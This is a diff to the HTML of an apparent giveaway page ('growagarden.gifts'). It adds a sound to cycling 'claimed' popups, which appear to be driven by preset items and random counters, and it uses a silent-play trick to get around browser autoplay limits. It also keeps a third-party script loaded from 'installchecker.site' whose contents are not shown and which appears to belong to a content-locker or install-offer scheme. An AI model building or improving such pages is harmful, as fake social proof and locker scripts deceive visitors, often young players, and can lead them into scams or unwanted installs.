@@ -671,8 +671,8 @@
 <link rel="me" href="https://www.blogger.com/profile/11765107438099270178">
 <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
 <meta name="google-adsense-platform-domain" content="blogspot.com">
-<link rel="icon" type="image/x-icon" href="https://growagarden.gifts/favicon.ico">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
+<link rel="icon" type="image/x-icon" href="images/favicon.ico">
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -816,6 +816,10 @@
   <audio id="clickSound" preload="auto">
     <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
   </audio>
+
+  <audio id="notifSound" preload="auto">
+    <source src="media/notifcation.mp3" type="audio/mpeg">
+  </audio>
   
   <script>
     // Function to generate random number between 90 and 900
@@ -919,6 +923,10 @@
         if (popupOpen) return;
         if (notificationItems.length === 0) return;
         $(".cliameds").fadeIn(); 
+        // Play notification sound
+        const notifSound = document.getElementById('notifSound');
+        notifSound.currentTime = 0;
+        notifSound.play();
         // Cycle through items
         const item = notificationItems[notificationIndex];
         notificationIndex = (notificationIndex + 1) % notificationItems.length;
@@ -1176,7 +1184,30 @@
       `;
       document.head.appendChild(style);
     })();
+
+    // Unlock notifSound on first user interaction
+    (function() {
+      let notifUnlocked = false;
+      function unlockNotifSound() {
+        if (notifUnlocked) return;
+        notifUnlocked = true;
+        const notifSound = document.getElementById('notifSound');
+        notifSound.volume = 0;
+        notifSound.play().then(() => {
+          notifSound.pause();
+          notifSound.currentTime = 0;
+          notifSound.volume = 1;
+        }).catch(() => {});
+        window.removeEventListener('click', unlockNotifSound);
+        window.removeEventListener('touchstart', unlockNotifSound);
+        window.removeEventListener('keydown', unlockNotifSound);
+      }
+      window.addEventListener('click', unlockNotifSound);
+      window.addEventListener('touchstart', unlockNotifSound);
+      window.addEventListener('keydown', unlockNotifSound);
+    })();
   </script>
-</body>
+
 <script type="text/javascript" src="https://installchecker.site/cp/js/j3pln"></script>
-</html>
+
+</body></html>
